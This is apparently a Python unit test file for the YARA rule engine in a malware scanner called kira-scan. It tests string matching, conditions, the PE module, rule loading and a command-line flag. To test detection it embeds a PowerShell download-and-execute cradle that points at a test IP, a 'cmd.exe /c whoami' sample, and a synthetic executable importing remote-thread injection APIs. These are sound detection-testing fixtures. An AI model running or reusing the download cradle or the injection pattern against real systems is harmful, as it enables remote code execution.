"""The YARA engine: the language, the modules, the rules it refuses, and kira-scan's --yara flag.

Expected values were checked against the real yara64 4.6 on the same bytes."""

import hashlib
import io
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

from helpers import RX, make_pe

from kirascan import cli, yara


def hits(rules, data, **ext):
    return [m.rule for m in yara.scan(yara.compile_text(rules), data, ext)]


class Strings(unittest.TestCase):
    def test_text_modifiers(self):
        data = b"xx Hello\0 W\0o\0r\0l\0d\0 " + bytes(b ^ 0x7A for b in b"hello") + b" foo_bar SGVsbG8gd29y"
        self.assertEqual(hits('''
            rule plain { strings: $a = "Hello" condition: $a }
            rule no_case { strings: $a = "hELLO" nocase condition: $a }
            rule wide_text { strings: $a = "World" wide condition: $a }
            rule ascii_only { strings: $a = "World" condition: $a }
            rule xored { strings: $a = "hello" xor(0x70-0x7f) condition: $a }
            rule fullword_no { strings: $a = "Hell" fullword condition: $a }
            rule underscore_splits_words { strings: $a = "foo" fullword condition: $a }
            rule fullword_yes { strings: $a = "foo_bar" fullword condition: $a }
            rule b64 { strings: $a = "Hello wor" base64 condition: $a }
            rule escapes { strings: $a = "Hello\\x00 W" condition: $a }
        ''', data), ["plain", "no_case", "wide_text", "xored", "underscore_splits_words", "fullword_yes", "b64", "escapes"])

    def test_hex_strings(self):
        data = bytes.fromhex("00 4D 5A 90 00 E8 11 22 33 44 C3 6A 64 FF D6 AA BB")
        self.assertEqual(hits('''
            rule wild { strings: $a = { 4D 5A ?? 00 E8 } condition: $a }
            rule nibble { strings: $a = { 4D 5? 90 } condition: $a }
            rule jump { strings: $a = { E8 [4] C3 } condition: $a }
            rule range { strings: $a = { 5A [1-8] C3 } condition: $a }
            rule range_short { strings: $a = { 5A [1-6] C3 } condition: $a }
            rule alt { strings: $a = { 6A ( 64 | 65 ) FF } condition: $a }
            rule not_byte { strings: $a = { FF ~D6 } condition: $a }
            rule comment {
                strings: $a = {
                    6a 64   // push 0x64 }
                    ff d6   /* call esi */
                }
                condition: $a }
        ''', data), ["wild", "nibble", "jump", "range", "alt", "comment"])

    def test_regex_and_wide_regex(self):
        data = b"GET /admin.php?id=1 " + "cmd.exe /c whoami".encode("utf-16-le")
        self.assertEqual(hits(r'''
            rule rx { strings: $a = /admin\.php\?id=\d+/ condition: $a }
            rule rx_i { strings: $a = /ADMIN\.PHP/i condition: $a }
            rule rx_wide { strings: $a = /cmd\.exe \/c [a-z]+/ wide condition: $a }
            rule rx_miss { strings: $a = /admin\.asp/ condition: $a }
        ''', data), ["rx", "rx_i", "rx_wide"])


class Conditions(unittest.TestCase):
    DATA = b"MZ" + b"\0" * 14 + b"evil evil evil good"

    def test_counts_offsets_and_sets(self):
        self.assertEqual(hits('''
            rule count { strings: $e = "evil" condition: #e == 3 and @e[2] == 21 and !e[1] == 4 }
            rule at_zero { strings: $m = "MZ" $e = "evil" condition: $m at 0 and $e in (0..20) }
            rule at_is_not_greedy { strings: $m = "MZ" $x = "absent" condition: $m at 0 and $x }
            rule two_of { strings: $a = "evil" $b = "good" $c = "nope" condition: 2 of them }
            rule pct { strings: $a = "evil" $b = "good" $c = "nope" condition: 50% of ($a, $b, $c) }
            rule none_of { strings: $x1 = "nope" $x2 = "nada" condition: none of ($x*) }
            rule all_at { strings: $a = "evil" condition: for all i in (1..#a) : ( @a[i] >= 16 ) }
            rule for_of { strings: $a = "evil" $b = "good" condition: for any of ($a, $b) : ( # > 2 ) }
            rule math_ops { condition: (filesize \\ 7) * 7 + filesize % 7 == filesize and (1 << 4 | 1) == 17 }
            rule ints { condition: uint16(0) == 0x5A4D and uint16be(0) == 0x4D5A and uint8(filesize - 1) == 0x64 }
            rule undefined_stays_undefined { condition: not (uint32(filesize) == 0) }
        ''', self.DATA), ["count", "at_zero", "two_of", "pct", "none_of", "all_at", "for_of", "math_ops", "ints"])

    def test_rule_references_private_global_and_externals(self):
        rules = '''
            private rule is_mz { condition: uint16(0) == 0x5A4D }
            rule uses_private { condition: is_mz }
            rule by_name { condition: filename iendswith ".exe" and extension == ".exe" }
        '''
        rs = yara.compile_text(rules, externals={"filename": "", "extension": ""})
        self.assertEqual([m.rule for m in yara.scan(rs, self.DATA, {"filename": "A.EXE", "extension": ".exe"})],
                         ["uses_private", "by_name"])
        self.assertEqual([m.rule for m in yara.scan(rs, self.DATA)], ["uses_private"])
        self.assertEqual(hits('''
            global rule big_enough { condition: filesize > 1000 }
            rule anything { condition: true }
        ''', self.DATA), [])

    def test_string_functions(self):
        self.assertEqual(hits('''
            import "hash"
            import "math"
            rule h { condition: hash.md5(0, 2) == "%s" and hash.crc32(0, filesize) > 0 }
            rule e { condition: math.entropy(2, 14) == 0.0 and math.entropy(0, filesize) > 1 }
        ''' % hashlib.md5(b"MZ").hexdigest(), self.DATA), ["h", "e"])


class PeModule(unittest.TestCase):
    PE = make_pe([(".text", RX, b"\xc3" * 64)], timestamp=0x5F000000,
                 imports={"KERNEL32.dll": ["VirtualAllocEx", "CreateRemoteThread"], "WS2_32.dll": ["connect"]})

    def test_header_imports_and_imphash(self):
        imphash = hashlib.md5(b"kernel32.virtualallocex,kernel32.createremotethread,ws2_32.connect").hexdigest()
        self.assertEqual(hits(f'''
            import "pe"
            rule header {{ condition: pe.is_pe and pe.is_64bit() and not pe.is_dll() and pe.machine == pe.MACHINE_AMD64
                                   and pe.timestamp == 0x5F000000 and pe.number_of_sections == 2 }}
            rule sections {{ condition: pe.sections[0].name == ".text" and pe.section_index(".idata") == 1 and
                                     for any s in pe.sections : ( s.name == ".idata" ) }}
            rule imports {{ condition: pe.imports("kernel32.dll", "CreateRemoteThread") and pe.imports("ws2_32.dll") == 1
                                   and pe.imports(/kernel32/i, /^Virtual/) == 1 and not pe.imports("ntdll.dll", "NtOpen") }}
            rule imphash {{ condition: pe.imphash() == "{imphash}" }}
            rule not_pe {{ condition: pe.is_pe and pe.number_of_sections == 0 }}
        ''', self.PE), ["header", "sections", "imports", "imphash"])

    def test_not_a_pe_is_undefined_not_an_error(self):
        self.assertEqual(hits('import "pe"\nrule a { condition: not pe.is_pe }\nrule b { condition: pe.number_of_sections < 3 }',
                              b"plain text"), ["a"])


class Loading(unittest.TestCase):
    def test_unsupported_rules_are_skipped_with_the_reason_and_the_rest_load(self):
        rs = yara.compile_text('''
            import "pe"
            import "cuckoo"
            rule signed { condition: pe.number_of_signatures > 0 }
            rule broken { strings: $a = "x" condition: $a and $b }
            rule sandbox { condition: cuckoo.network.http_request(/evil/) }
            include "other.yar"
            rule fine { strings: $a = "ok" condition: $a }
        ''', "t.yar")
        self.assertEqual([r.name for r in rs.rules], ["fine"])
        reasons = {name: why for _, name, why in rs.skipped}
        self.assertIn("pe.number_of_signatures is not supported", reasons["signed"])
        self.assertIn("undefined string $b", reasons["broken"])
        self.assertIn("cuckoo", reasons["sandbox"])
        self.assertIn("include", reasons[""])

    def test_example_rules_load_whole_and_catch_a_cradle(self):
        rs = yara.load_rules([Path(__file__).parent.parent / "examples" / "hunting.yar"])
        self.assertEqual((len(rs.rules), rs.skipped), (3, []))
        cradle = b'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.7/a.ps1")'
        self.assertEqual([m.rule for m in yara.scan(rs, cradle)], ["PowerShell_Download_Cradle"])

    def test_hostile_input_never_hangs_or_crashes(self):
        rs = yara.compile_text('''
            rule r { strings: $a = /(a+)+b/ $h = { 4D 5A [0-1000] 50 45 } condition: #a > 0 or $h }
        ''')
        data = b"MZ" + b"a" * 3000
        yara.scan(rs, data)
        for junk in ("rule", "rule x {", "rule x { condition: ( }", "rule x { strings: $a = { 4G } condition: $a }", "}}}"):
            yara.compile_text(junk)


class CommandLine(unittest.TestCase):
    def test_yara_flag_scores_and_reports(self):
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            (d / "rules.yar").write_text('''
                import "pe"
                rule Demo_Injector { meta: description = "remote thread injector" score = 80
                    condition: pe.imports("kernel32.dll", "CreateRemoteThread") }
                rule Unsupported { condition: pe.number_of_signatures == 0 }
            ''')
            (d / "inject.exe").write_bytes(PeModule.PE)
            out, err = io.StringIO(), io.StringIO()
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main([str(d / "inject.exe"), "--yara", str(d / "rules.yar"), "--no-color"])
            self.assertEqual(code, 2)
            self.assertIn("1 YARA rule(s) loaded from 1 file(s), 1 skipped", err.getvalue())
            self.assertIn("YARA rule Demo_Injector", out.getvalue())
            self.assertIn("remote thread injector", out.getvalue())
            with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
                self.assertEqual(cli.main([str(d / "inject.exe"), "--yara", str(d / "missing.yar")]), 3)


if __name__ == "__main__":
    unittest.main()
